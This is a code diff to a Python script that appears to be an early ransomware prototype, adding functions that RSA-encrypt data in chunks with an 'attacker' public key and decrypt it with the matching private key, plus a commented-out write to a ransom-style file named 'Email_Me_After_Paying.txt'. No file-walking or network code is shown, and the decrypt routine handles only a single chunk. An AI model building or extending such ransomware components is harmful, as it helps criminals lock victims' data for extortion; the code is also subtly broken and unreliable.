@@ -1,3 +1,4 @@
+import base64
 import os
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend as crypto_default_backend
@@ -52,7 +53,8 @@ def encrypt_data():
     f.close()
     print(testfile)
     with open("./public.pem", "rb") as key_file:
-        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(), backend=crypto_default_backend())
+        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
+                                                                       backend=crypto_default_backend())
         enc_text = attacker_public_key.encrypt(testfile, crypto_padding.OAEP(
             mgf=crypto_padding.MGF1(
                 algorithm=crypto_hashes.SHA256()),
@@ -62,8 +64,52 @@ def encrypt_data():
     print(enc_text)
 
 
+def encrypt_blob(fileblob, public_key_path):
+    with open(public_key_path, "rb") as key_file:
+        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
+                                                                       backend=crypto_default_backend())
+    chunk_size = 430
+    offset = 0
+    end_loop = False
+    encrypted = b""
+    while not end_loop:
+        chunk = fileblob[offset: offset + chunk_size]
+        if len(chunk) % chunk_size != 0:
+            end_loop = True
+            chunk += b" " * (chunk_size - len(chunk))
+        print(chunk)
+        enc_chunk = attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
+            mgf=crypto_padding.MGF1(
+                algorithm=crypto_hashes.SHA256()),
+            algorithm=crypto_hashes.SHA256(),
+            label=None
+        ))
+        encrypted += enc_chunk
+        offset += chunk_size
+    encrypted_blob = base64.b64encode(encrypted)
+    print(encrypted_blob)
+    return encrypted_blob
+    # with open("./Email_Me_After_Paying.txt", "wb") as fa:
+    #    fa.write(encrypted_blob)
+
+
+def decrypt_blob(fileblob, private_key_path):
+    fileblob = base64.b64decode(fileblob)
+    with open(private_key_path, "rb") as key_file:
+        attacker_private_key = crypto_serialization.load_pem_private_key(key_file.read(), password=None, backend=crypto_default_backend())
+    dec_chunk = attacker_private_key.decrypt(fileblob, crypto_padding.OAEP(
+        mgf=crypto_padding.MGF1(
+            algorithm=crypto_hashes.SHA256()),
+        algorithm=crypto_hashes.SHA256(),
+        label=None
+    ))
+    print(dec_chunk)
+
+
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     print("Keys have been generated.")
     # genattackerkeys()
     # encrypt_data()
+    out = encrypt_blob(b'Hello Dallas!', "./public.pem")
+    decrypt_blob(out, "./private.pem")
